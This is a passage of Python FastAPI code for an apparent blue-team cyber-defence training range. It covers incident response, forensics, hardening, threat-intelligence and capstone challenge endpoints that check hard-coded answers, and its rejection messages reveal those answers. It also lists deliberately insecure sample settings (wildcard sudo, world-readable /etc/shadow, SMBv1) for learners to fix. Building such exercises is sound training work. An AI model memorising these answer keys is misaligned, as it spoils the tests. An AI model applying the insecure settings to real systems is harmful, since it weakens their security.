    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_response_state(sess_id)
    iso = bool(body.get("isolate_host", False))
    rev = bool(body.get("revoke_tokens", False))
    host = str(body.get("target_host", "")).strip().upper()
    if iso and rev and "DB-PROD" in host:
        state["contained"] = True
        return JSONResponse({
            "status": "HOST_CONTAINED",
            "target_host": host,
            "isolation_type": "EDR_NETWORK_ISOLATION_EXCEPT_IR_GATEWAY",
            "credentials_revoked": ["svc_db_sync", "ST-VOLT-9921"],
            "verification_token": "RESPONSE_CONTAINMENT_ENFORCED",
        })
    return JSONResponse({"status": "REJECTED", "message": "Containment requires isolate_host=true, revoke_tokens=true, and target_host ('DB-PROD-01')."}, status_code=400)


@incident_response_app.post("/api/response/eradicate")
async def response_eradicate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_response_state(sess_id)
    pid = int(body.get("terminate_pid", 0))
    svc = str(body.get("remove_service", "")).strip().lower()
    ip = str(body.get("block_egress_ip", "")).strip()
    if pid == 3912 and "svc_winupdater" in svc and ip == "198.51.100.77":
        state["eradicated"] = True
        return JSONResponse({
            "status": "THREAT_ERADICATED",
            "terminated_pid": pid,
            "removed_service": svc,
            "blocked_egress_ip": ip,
            "verification_token": "RESPONSE_ERADICATION_COMPLETE",
        })
    return JSONResponse({"status": "REJECTED", "message": "Eradication requires terminate_pid (3912), remove_service ('svc_winupdater'), and block_egress_ip ('198.51.100.77')."}, status_code=400)


@incident_response_app.api_route("/challenge", methods=["GET", "POST"])
async def response_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_response_state(sess_id)
        if not state.get("contained") or not state.get("eradicated"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: You must execute both containment (POST /api/response/contain) and eradication (POST /api/response/eradicate) before submitting final lifecycle review.",
            }, status_code=400)
        inc_id = str(body.get("incident_id", "")).strip().upper()
        standard = str(body.get("lifecycle_standard", "")).strip().upper()
        c_ver = bool(body.get("containment_verified", False))
        e_ver = bool(body.get("eradication_verified", False))
        if inc_id == "IR-2026-088" and ("NIST" in standard or "PICERL" in standard) and c_ver and e_ver:
            state["lifecycle_verified"] = True
            return JSONResponse({
                "status": "INCIDENT_RESPONSE_LIFECYCLE_VERIFIED",
                "finding": "Incident response lifecycle verified: IR-2026-088 contained, RAM forensics acquired, persistence eradicated, and post-incident lessons learned initiated.",
                "verification_token": "INCIDENT_RESPONSE_LIFECYCLE_VERIFIED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid lifecycle review parameters. Ensure incident_id ('IR-2026-088'), lifecycle_standard ('NIST_SP_800_61'), containment_verified (true), and eradication_verified (true)."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing incident_id, lifecycle_standard, containment_verified, and eradication_verified.",
    })


# ============================================================================
# BLUE ROOM 17: DIGITAL FORENSICS (PORT 8217)
# ============================================================================

forensics_app = FastAPI(title="VoltDefense Digital Forensics & Incident Reconstruction Lab")

_FORENSICS_ARTIFACTS = {
    "case_id": "FOR-2026-091",
    "target_host": "DB-PROD-01",
    "artifacts": [
        {
            "name": "evidence_artifact.bin",
            "path": "/var/log/forensics/evidence_artifact.bin",
            "size_bytes": 4096,
            "sha256": "8f4c2e6b19a0d3f78b54921b72a912e84c980312fa8901237a35b1d9821811fa",
            "description": "Captured malicious staging drop file from memory acquisition",
        },
        {
            "name": "memdump.raw",
            "path": "/var/log/forensics/memdump.raw",
            "size_bytes": 1048576,
            "sha256": "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123",
            "description": "Raw physical memory image acquired via LiME / WinPmem",
        },
    ],
    "mft_records": [
        {
            "inode": 89104,
            "path": "C:\\Users\\Public\\Temp_Exfil",
            "file_type": "DIRECTORY",
            "macb": {
                "modified": "2026-11-15T09:12:00Z",
                "accessed": "2026-11-15T09:14:22Z",
                "changed": "2026-11-15T09:12:00Z",
                "born": "2026-11-15T09:12:00Z",
            },
            "flags": "UNAUTHORIZED_STAGING_CREATION",
        },
        {
            "inode": 1044,
            "path": "C:\\Windows\\System32\\svchost.exe",
            "file_type": "FILE",
            "macb": {
                "modified": "2024-02-10T12:00:00Z",
                "accessed": "2026-11-15T08:50:00Z",
                "changed": "2024-02-10T12:00:00Z",
                "born": "2024-02-10T12:00:00Z",
            },
            "flags": "SYSTEM_CORE_LEGITIMATE",
        },
    ],
}


@forensics_app.get("/")
def forensics_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Digital Forensics Lab</title></head>"
        "<body><h1>VoltDefense Digital Forensics & Incident Reconstruction (RFC 3227)</h1>"
        "<p>Endpoints: /api/forensics/artifacts, /api/forensics/timeline, /challenge</p>"
        "</body></html>"
    )


@forensics_app.get("/api/forensics/artifacts")
def forensics_get_artifacts():
    return JSONResponse({
        "status": "FORENSIC_ARTIFACTS",
        "case_id": _FORENSICS_ARTIFACTS["case_id"],
        "target_host": _FORENSICS_ARTIFACTS["target_host"],
        "artifacts": _FORENSICS_ARTIFACTS["artifacts"],
        "mft_records": _FORENSICS_ARTIFACTS["mft_records"],
    })


@forensics_app.get("/api/forensics/timeline")
def forensics_get_timeline():
    return JSONResponse({
        "status": "FORENSIC_TIMELINE",
        "case_id": "FOR-2026-091",
        "events": [
            {
                "timestamp": "2026-11-15T09:00:01Z",
                "event": "Initial suspicious outbound socket connection to 198.51.100.77:443",
                "source": "Network/EDR",
            },
            {
                "timestamp": "2026-11-15T09:10:14Z",
                "event": "PowerShell execution of dropper payload (T1059.001)",
                "source": "Process Tree / PID 3912",
            },
            {
                "timestamp": "2026-11-15T09:12:00Z",
                "event": "Unauthorized staging directory creation C:\\Users\\Public\\Temp_Exfil (Inode 89104)",
                "source": "NTFS MFT Record 89104",
            },
            {
                "timestamp": "2026-11-15T09:14:22Z",
                "event": "Data collection and archive creation inside Temp_Exfil",
                "source": "Filesystem MACB Metadata",
            },
        ],
    })


@forensics_app.post("/api/forensics/timeline")
async def forensics_post_timeline(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_forensics_state(sess_id)
    inode = int(body.get("inode", 0))
    event_type = str(body.get("event_type", "")).strip().upper()
    timestamp = str(body.get("timestamp", "")).strip()

    if inode == 89104 and ("STAGING" in event_type or event_type == "UNAUTHORIZED_STAGING_CREATION") and "2026-11-15T09:12" in timestamp:
        state["timeline_verified"] = True
        return JSONResponse({
            "status": "TIMELINE_CONFIRMED",
            "inode": inode,
            "event_type": event_type,
            "timestamp": timestamp,
            "verification_token": "FORENSICS_TIMELINE_CONFIRMED",
            "message": "Forensic timeline event verified: Inode 89104 correlates with unauthorized staging folder creation.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Invalid timeline reconstruction parameters. Required: inode (89104), event_type ('UNAUTHORIZED_STAGING_CREATION'), timestamp ('2026-11-15T09:12:00Z')."},
        status_code=400,
    )


@forensics_app.api_route("/challenge", methods=["GET", "POST"])
async def forensics_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_forensics_state(sess_id)
        if not state.get("timeline_verified"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: You must verify the forensic timeline via POST /api/forensics/timeline before submitting challenge.",
            }, status_code=400)
        case_id = str(body.get("case_id", "")).strip().upper()
        evidence_hash = str(body.get("evidence_hash", "")).strip().lower()
        attacker_action = str(body.get("attacker_action", "")).strip().upper()

        if case_id == "FOR-2026-091" and evidence_hash in ["34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465", "8f4c2e6b19a0d3f78b54921b72a912e84c980312fa8901237a35b1d9821811fa"] and ("STAGING" in attacker_action or "TAMPERING" in attacker_action):
            state["case_verified"] = True
            return JSONResponse({
                "status": "DIGITAL_FORENSICS_INVESTIGATION_COMPLETE",
                "case_id": case_id,
                "evidence_hash": evidence_hash,
                "attacker_action": attacker_action,
                "verification_token": "DIGITAL_FORENSICS_INVESTIGATION_COMPLETE",
                "message": "Digital forensics investigation verified: evidence hash matches recovered artifact and chain of custody validated.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid forensics challenge parameters. Required: case_id ('FOR-2026-091'), evidence_hash (64-char SHA256), attacker_action ('DATA_STAGING_AND_TAMPERING')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with case_id, evidence_hash, and attacker_action.",
    })


# ============================================================================
# BLUE ROOM 18: WINDOWS AND LINUX HARDENING (PORT 8218)
# ============================================================================

hardening_app = FastAPI(title="VoltDefense System Hardening & Security Baseline Center")

_HARDENING_POSTURE = {
    "linux": {
        "sshd_config": {
            "PermitRootLogin": "yes",
            "PasswordAuthentication": "yes",
            "PubkeyAuthentication": "yes",
            "MaxAuthTries": 10,
        },
        "sudoers": {
            "wildcard_rule": "operator ALL=(ALL:ALL) NOPASSWD: ALL",
            "risk": "CRITICAL_UNRESTRICTED_ROOT",
        },
        "file_permissions": {
            "/etc/shadow": "0644",
            "/etc/passwd": "0644",
            "/etc/ssh/sshd_config": "0644",
        },
    },
    "windows": {
        "account_policy": {
            "AccountLockoutThreshold": 0,
            "AccountLockoutDuration": 0,
            "ResetLockoutCounterAfter": 0,
        },
        "powershell": {
            "ExecutionPolicy": "Unrestricted",
            "ScriptBlockLogging": "Disabled",
        },
        "protocols": {
            "SMBv1": "Enabled",
            "LLMNR": "Enabled",
            "NBT_NS": "Enabled",
        },
    },
}


@hardening_app.get("/")
def hardening_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Hardening Baseline</title></head>"
        "<body><h1>VoltDefense System Hardening & Security Baselines (CIS / DISA STIG)</h1>"
        "<p>Endpoints: /api/hardening/posture, /api/hardening/linux/apply, /api/hardening/windows/apply, /challenge</p>"
        "</body></html>"
    )


@hardening_app.get("/api/hardening/posture")
def hardening_get_posture():
    return JSONResponse({
        "status": "AUDIT_POSTURE",
        "posture": _HARDENING_POSTURE,
    })


@hardening_app.post("/api/hardening/linux/apply")
async def hardening_apply_linux(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_hardening_state(sess_id)
    disable_root = bool(body.get("disable_root_ssh", False))
    enforce_keys = bool(body.get("enforce_key_auth", False))
    remove_wildcard = bool(body.get("remove_wildcard_sudo", False))

    if disable_root and enforce_keys and remove_wildcard:
        state["linux_remediated"] = True
        state["linux_controls"] = {
            "PermitRootLogin": "no",
            "PasswordAuthentication": "no",
            "PubkeyAuthentication": "yes",
            "sudoers": "operator ALL=(ALL) ALL (PASSWD enforced)",
        }
        return JSONResponse({
            "status": "LINUX_HARDENING_ENFORCED",
            "controls_applied": state["linux_controls"],
            "verification_token": "LINUX_HARDENING_ENFORCED",
            "message": "Linux hardening controls enforced: root SSH login disabled, key authentication mandated, wildcard sudo removed.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Linux hardening requires disable_root_ssh=true, enforce_key_auth=true, and remove_wildcard_sudo=true."},
        status_code=400,
    )


@hardening_app.post("/api/hardening/windows/apply")
async def hardening_apply_windows(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_hardening_state(sess_id)
    threshold = int(body.get("lockout_threshold", 0))
    ps_policy = str(body.get("powershell_policy", "")).strip()
    disable_smbv1 = bool(body.get("disable_smbv1", False))

    if threshold >= 3 and ps_policy in ["RemoteSigned", "AllSigned", "Restricted"] and disable_smbv1:
        state["windows_remediated"] = True
        state["windows_controls"] = {
            "AccountLockoutThreshold": threshold,
            "PowerShellExecutionPolicy": ps_policy,
            "SMBv1": "Disabled",
        }
        return JSONResponse({
            "status": "WINDOWS_HARDENING_APPLIED",
            "controls_applied": state["windows_controls"],
            "message": "Windows CIS baseline applied: account lockout enforced, PowerShell execution secured, SMBv1 eradicated.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Windows hardening requires lockout_threshold (>=3), powershell_policy ('RemoteSigned'), and disable_smbv1=true."},
        status_code=400,
    )


@hardening_app.api_route("/challenge", methods=["GET", "POST"])
async def hardening_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_hardening_state(sess_id)
        if not state.get("linux_remediated") or not state.get("windows_remediated"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: You must apply both Linux (/api/hardening/linux/apply) and Windows (/api/hardening/windows/apply) hardening baselines before submitting challenge.",
            }, status_code=400)
        scope = str(body.get("target_scope", "")).strip().upper()
        linux_rem = bool(body.get("linux_remediated", False))
        win_rem = bool(body.get("windows_remediated", False))

        if "DUAL_OS" in scope and linux_rem and win_rem:
            state["hardening_verified"] = True
            return JSONResponse({
                "status": "SYSTEM_HARDENING_BASELINE_VERIFIED",
                "target_scope": scope,
                "verification_token": "SYSTEM_HARDENING_BASELINE_VERIFIED",
                "message": "Enterprise hardening baseline verified across Linux and Windows operating systems.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: target_scope ('DUAL_OS_ENTERPRISE'), linux_remediated (true), and windows_remediated (true)."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with target_scope, linux_remediated, and windows_remediated.",
    })


# ============================================================================
# BLUE ROOM 19: THREAT INTELLIGENCE (PORT 8219)
# ============================================================================

threat_intel_app = FastAPI(title="VoltDefense Cyber Threat Intelligence & Diamond Model Platform")

_STIX_FEED = {
    "type": "bundle",
    "id": "bundle--9d04218a-f542-491a-8219-c0ffee192026",
    "objects": [
        {
            "type": "threat-actor",
            "id": "threat-actor--7a35b1d9-8218-11fa-ec29-84b238290348",
            "name": "APT-VOLT-VIPER",
            "aliases": ["ViperVolt", "GHOST-STORM"],
            "description": "State-sponsored cyber espionage threat group targeting critical energy infrastructure.",
            "primary_motivation": "espionage",
        },
        {
            "type": "malware",
            "id": "malware--8f4c2e6b-19a0-d3f7-8b54-921b72a912e8",
            "name": "VoltDrop",
            "is_family": True,
            "malware_types": ["dropper", "backdoor"],
            "description": "Multi-stage obfuscated PowerShell dropper with encrypted C2 beacons.",
        },
        {
            "type": "attack-pattern",
            "id": "attack-pattern--1566-001",
            "name": "Spearphishing Attachment",
            "external_references": [{"source_name": "mitre-attack", "external_id": "T1566.001"}],
        },
        {
            "type": "attack-pattern",
            "id": "attack-pattern--1059-001",
            "name": "PowerShell Execution",
            "external_references": [{"source_name": "mitre-attack", "external_id": "T1059.001"}],
        },
        {
            "type": "indicator",
            "id": "indicator--c2-ip-01",
            "pattern": "[ipv4-addr:value = '198.51.100.77']",
            "pattern_type": "stix",
            "name": "Malicious C2 Command & Control IPv4 Address",
            "valid_from": "2026-11-01T00:00:00Z",
            "confidence": 95,
        },
        {
            "type": "indicator",
            "id": "indicator--c2-domain-01",
            "pattern": "[domain-name:value = 'update-cdn.voltcorp-support.internal']",
            "pattern_type": "stix",
            "name": "Malicious Fast-Flux C2 Domain",
            "valid_from": "2026-11-01T00:00:00Z",
            "confidence": 90,
        },
    ],
}

_IOC_LIST = [
    {"type": "IPv4", "value": "198.51.100.77", "context": "Active C2 Server", "threat_actor": "APT-VOLT-VIPER", "confidence": "High"},
    {"type": "Domain", "value": "update-cdn.voltcorp-support.internal", "context": "C2 Domain", "threat_actor": "APT-VOLT-VIPER", "confidence": "High"},
    {"type": "SHA-256", "value": "8f4c2e6b19a0d3f78b54921b72a912e84c980312fa8901237a35b1d9821811fa", "context": "VoltDrop Dropper Binary", "threat_actor": "APT-VOLT-VIPER", "confidence": "High"},
    {"type": "MITRE", "value": "T1566.001", "context": "Initial Access: Spearphishing Attachment", "threat_actor": "APT-VOLT-VIPER", "confidence": "High"},
    {"type": "MITRE", "value": "T1059.001", "context": "Execution: PowerShell Cmdlet Obfuscation", "threat_actor": "APT-VOLT-VIPER", "confidence": "High"},
]


@threat_intel_app.get("/")
def intel_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Threat Intelligence</title></head>"
        "<body><h1>VoltDefense Cyber Threat Intelligence & Diamond Model Platform (STIX 2.1)</h1>"
        "<p>Endpoints: /api/intel/stix-feed, /api/intel/iocs, /api/intel/correlate, /api/intel/attck-map, /challenge</p>"
        "</body></html>"
    )


@threat_intel_app.get("/api/intel/stix-feed")
def intel_get_stix():
    return JSONResponse({
        "status": "STIX_2_1_FEED",
        "bundle": _STIX_FEED,
    })


@threat_intel_app.get("/api/intel/iocs")
def intel_get_iocs():
    return JSONResponse({
        "status": "INDICATORS_OF_COMPROMISE",
        "total_iocs": len(_IOC_LIST),
        "iocs": _IOC_LIST,
    })


@threat_intel_app.post("/api/intel/correlate")
async def intel_post_correlate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_intel_state(sess_id)
    actor = str(body.get("threat_actor", "")).strip().upper()
    c2_ip = str(body.get("c2_ip", "")).strip()
    c2_dom = str(body.get("c2_domain", "")).strip().lower()
    malware = str(body.get("malware_family", "")).strip().lower()

    if actor == "APT-VOLT-VIPER" and c2_ip == "198.51.100.77" and "voltcorp" in c2_dom and "voltdrop" in malware:
        state["correlated"] = True
        state["correlation_data"] = {
            "threat_actor": actor,
            "c2_ip": c2_ip,
            "c2_domain": c2_dom,
            "malware_family": malware,
        }
        return JSONResponse({
            "status": "INTEL_CORRELATION_CONFIRMED",
            "correlation": state["correlation_data"],
            "verification_token": "INTEL_CORRELATION_CONFIRMED",
            "message": "Threat intelligence correlation verified across Diamond Model vertices.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Correlation requires threat_actor ('APT-VOLT-VIPER'), c2_ip ('198.51.100.77'), c2_domain ('update-cdn.voltcorp-support.internal'), and malware_family ('VoltDrop')."},
        status_code=400,
    )


@threat_intel_app.post("/api/intel/attck-map")
async def intel_post_attck_map(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_intel_state(sess_id)
    actor = str(body.get("threat_actor", "")).strip().upper()
    prim = str(body.get("primary_technique", "")).strip().upper()
    sec = str(body.get("secondary_technique", "")).strip().upper()

    if actor == "APT-VOLT-VIPER" and "T1566" in prim and "T1059" in sec:
        state["attck_mapped"] = True
        state["attck_techniques"] = [prim, sec]
        return JSONResponse({
            "status": "ATTCK_MAPPING_VERIFIED",
            "threat_actor": actor,
            "mapped_techniques": state["attck_techniques"],
            "message": "MITRE ATT&CK techniques mapped successfully: Initial Access (T1566.001) & Execution (T1059.001).",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "ATT&CK mapping requires threat_actor ('APT-VOLT-VIPER'), primary_technique ('T1566.001'), and secondary_technique ('T1059.001')."},
        status_code=400,
    )


@threat_intel_app.api_route("/challenge", methods=["GET", "POST"])
async def intel_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_intel_state(sess_id)
        if not state.get("correlated") or not state.get("attck_mapped"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: You must correlate indicators (/api/intel/correlate) and map ATT&CK techniques (/api/intel/attck-map) before submitting the assessment dossier.",
            }, status_code=400)
        camp_id = str(body.get("campaign_id", "")).strip().upper()
        confidence = str(body.get("confidence_score", "")).strip().upper()
        rec = str(body.get("defensive_recommendation", "")).strip().upper()

        if camp_id == "CMP-2026-VOLT" and confidence == "HIGH" and ("BLOCK" in rec or "CONTAIN" in rec):
            state["intel_verified"] = True
            return JSONResponse({
                "status": "THREAT_INTEL_ASSESSMENT_DELIVERED",
                "campaign_id": camp_id,
                "confidence_score": confidence,
                "defensive_recommendation": rec,
                "verification_token": "THREAT_INTEL_ASSESSMENT_DELIVERED",
                "message": "Actionable threat intelligence assessment dossier delivered and verified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: campaign_id ('CMP-2026-VOLT'), confidence_score ('HIGH'), defensive_recommendation (containing 'BLOCK')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with campaign_id, confidence_score, and defensive_recommendation.",
    })


# ============================================================================
# BLUE ROOM 20: BLUE TEAM CAPSTONE (PORT 8220)
# ============================================================================

blue_capstone_app = FastAPI(title="VoltDefense Blue Team Capstone - Enterprise Incident Response Engine")

_CAPSTONE_INCIDENT_BRIEF = {
    "case_id": "CAPSTONE-IR-FINAL",
    "severity": "CRITICAL",
    "organization": "VoltCorp Global Infrastructure",
    "compromised_host": "DB-PROD-01",
    "host_ip": "10.10.20.15",
    "operating_system": "Windows Server 2022 Datacenter",
    "attacker_c2_ip": "198.51.100.77",
    "attacker_c2_domain": "update-cdn.voltcorp-support.internal",
    "threat_actor": "APT-VOLT-VIPER",
    "malicious_pid": 3912,
    "persistence_service": "svc_winupdater",
    "malicious_binary": "C:\\Windows\\Temp\\win_updater.exe",
    "compromised_account": "svc_db_sync",
    "compromised_token": "ST-VOLT-9921",
    "ram_evidence_hash": "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123",
    "dropper_hash": "8f4c2e6b19a0d3f78b54921b72a912e84c980312fa8901237a35b1d9821811fa",
    "exfiltration_volume_mb": 2400,
    "technique": "T1059.001",
}


@blue_capstone_app.get("/")
def blue_capstone_root():
    return HTMLResponse(
        "<html><head><title>VoltDefense Blue Team Capstone</title></head>"
        "<body><h1>VoltDefense Blue Team Capstone: Enterprise Incident Response Lifecycle</h1>"
        "<p>Endpoints: /api/capstone/stage-status, /api/capstone/incident-data, /api/capstone/detect, /api/capstone/hunt, /api/capstone/forensics, /api/capstone/triage, /api/capstone/contain, /challenge</p>"
        "</body></html>"
    )


@blue_capstone_app.get("/api/capstone/incident-data")
def blue_capstone_incident_data():
    return JSONResponse({
        "status": "CAPSTONE_INCIDENT_DATA",
        "incident": _CAPSTONE_INCIDENT_BRIEF,
    })


@blue_capstone_app.get("/api/capstone/stage-status")
def blue_capstone_stage_status(request: Request):
    sess_id = None
    try:
        sess_id, _, _ = require_trusted_session(request)
    except Exception:
        pass
    state = get_blue_capstone_state(sess_id) if sess_id else {}
    return JSONResponse({
        "status": "CAPSTONE_STAGES",
        "stages": [
            {"stage": 1, "name": "Detection & Scoping", "verified": state.get("detect_verified", False)},
            {"stage": 2, "name": "Network & Timeline Analysis", "verified": state.get("detect_verified", False)},
            {"stage": 3, "name": "Adversary Threat Hunting", "verified": state.get("hunt_verified", False)},
            {"stage": 4, "name": "Forensic Evidence Acquisition", "verified": state.get("forensics_verified", False)},
            {"stage": 5, "name": "Threat Intelligence Correlation", "verified": state.get("triage_verified", False)},
            {"stage": 6, "name": "Incident Triage & Severity", "verified": state.get("triage_verified", False)},
            {"stage": 7, "name": "Host & Network Containment", "verified": state.get("contain_verified", False)},
            {"stage": 8, "name": "Threat Eradication & Remediation", "verified": state.get("contain_verified", False)},
            {"stage": 9, "name": "Executive Incident Report", "verified": state.get("capstone_complete", False)},
        ],
    })


@blue_capstone_app.post("/api/capstone/detect")
async def blue_capstone_detect(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_blue_capstone_state(sess_id)
    stage = str(body.get("stage", "")).strip().upper()
    ip = str(body.get("adversary_ip", "")).strip()
    asset = str(body.get("compromised_asset", "")).strip().upper()

    if stage == "DETECTION" and ip == "198.51.100.77" and "DB-PROD" in asset:
        state["detect_verified"] = True
        return JSONResponse({
            "status": "CAPSTONE_STAGE1_DETECT_OK",
            "stage": stage,
            "adversary_ip": ip,
            "compromised_asset": asset,
            "verification_token": "CAPSTONE_STAGE1_DETECT_OK",
            "message": "Stage 1 & 2 Detection verified: compromised asset DB-PROD-01 confirmed communicating with external adversary IP 198.51.100.77.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Stage 1 & 2 requires stage ('DETECTION'), adversary_ip ('198.51.100.77'), and compromised_asset ('DB-PROD-01')."},
        status_code=400,
    )


@blue_capstone_app.post("/api/capstone/hunt")
async def blue_capstone_hunt(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_blue_capstone_state(sess_id)
    if not state.get("detect_verified"):
        return JSONResponse({"status": "REJECTED", "message": "Stage 1 Detection must be verified before proceeding to Threat Hunting."}, status_code=400)
    stage = str(body.get("stage", "")).strip().upper()
    pid = int(body.get("malicious_pid", 0))
    svc = str(body.get("persistence_service", "")).strip().lower()
    tech = str(body.get("technique", "")).strip().upper()

    if stage == "THREAT_HUNTING" and pid == 3912 and "svc_winupdater" in svc and "T1059" in tech:
        state["hunt_verified"] = True
        return JSONResponse({
            "status": "CAPSTONE_STAGE3_HUNT_OK",
            "stage": stage,
            "malicious_pid": pid,
            "persistence_service": svc,
            "technique": tech,
            "verification_token": "CAPSTONE_STAGE3_HUNT_OK",
            "message": "Stage 3 Threat Hunting verified: malicious process PID 3912 and persistence service svc_winupdater confirmed.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Stage 3 requires stage ('THREAT_HUNTING'), malicious_pid (3912), persistence_service ('svc_winupdater'), and technique ('T1059.001')."},
        status_code=400,
    )


@blue_capstone_app.post("/api/capstone/forensics")
async def blue_capstone_forensics(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_blue_capstone_state(sess_id)
    if not state.get("hunt_verified"):
        return JSONResponse({"status": "REJECTED", "message": "Stage 3 Threat Hunting must be verified before proceeding to Forensics."}, status_code=400)
    stage = str(body.get("stage", "")).strip().upper()
    sha_ok = bool(body.get("sha256_verified", False))
    ram_hash = str(body.get("ram_hash", "")).strip().lower()

    if stage == "FORENSICS" and sha_ok and ram_hash == "7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123":
        state["forensics_verified"] = True
        return JSONResponse({
            "status": "CAPSTONE_STAGE4_FORENSICS_OK",
            "stage": stage,
            "ram_hash": ram_hash,
            "verification_token": "CAPSTONE_STAGE4_FORENSICS_OK",
            "message": "Stage 4 Forensic Evidence acquisition verified: physical RAM image SHA-256 hash verified against acquisition manifest.",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Stage 4 requires stage ('FORENSICS'), sha256_verified (true), and ram_hash ('7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123')."},
        status_code=400,
    )


@blue_capstone_app.post("/api/capstone/triage")
async def blue_capstone_triage(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_blue_capstone_state(sess_id)
    if not state.get("forensics_verified"):
        return JSONResponse({"status": "REJECTED", "message": "Stage 4 Forensics must be verified before proceeding to Triage."}, status_code=400)
    stage = str(body.get("stage", "")).strip().upper()
    sev = str(body.get("incident_severity", "")).strip().upper()
    actor = str(body.get("threat_actor", "")).strip().upper()
    exfil = int(body.get("exfil_volume_mb", 0))

    if stage == "TRIAGE" and sev == "CRITICAL" and actor == "APT-VOLT-VIPER" and exfil >= 2000:
        state["triage_verified"] = True
        return JSONResponse({
            "status": "CAPSTONE_STAGE6_TRIAGE_OK",
            "stage": stage,
            "incident_severity": sev,
            "threat_actor": actor,
            "exfil_volume_mb": exfil,
            "verification_token": "CAPSTONE_STAGE6_TRIAGE_OK",
            "message": "Stage 5 & 6 Intelligence & Triage verified: incident classified as CRITICAL (APT-VOLT-VIPER, 2400 MB exfiltrated).",
        })
    return JSONResponse(
        {"status": "REJECTED", "message": "Stage 5 & 6 requires stage ('TRIAGE'), incident_severity ('CRITICAL'), threat_actor ('APT-VOLT-VIPER'), and exfil_volume_mb (2400)."},
        status_code=400,
    )


@blue_capstone_app.post("/api/capstone/contain")
async def blue_capstone_contain(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_blue_capstone_state(sess_id)
    if not state.get("triage_verified"):
        return JSONResponse({"status": "REJECTED", "message": "Stage 5 & 6 Triage must be verified before proceeding to Containment."}, status_code=400)
    stage = str(body.get("stage", "")).strip().upper()
    host = str(body.get("isolate_host", "")).strip().upper()
    pid = int(body.get("terminate_pid", 0))
    tok = str(body.get("revoke_token", "")).strip().upper()

    if stage == "CONTAINMENT" and "DB-PROD" in host and pid == 3912 and tok == "ST-VOLT-9921":
        state["contain_verified"] = True
        return JSONResponse({
            "status": "CAPSTONE_STAGE7_CONTAIN_OK",
            "stage": stage,
            "isolated_host": host,
            "terminated_pid": pid,
            "revoked_token": tok,
            "verification_token": "CAPSTONE_STAGE7_CONTAIN_OK",
